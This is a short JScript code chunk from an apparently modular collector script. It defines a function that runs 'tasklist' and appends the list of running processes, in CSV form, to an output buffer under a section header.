// chunk: collectors/processes
// depends: core/emit_buffer, core/run_cmd
// provides: collect_processes
// format: jscript

function collect_processes() {
    emit("\r\n=== RUNNING PROCESSES ===\r\n");
    emit(_run("tasklist /fo csv /nh"));
}
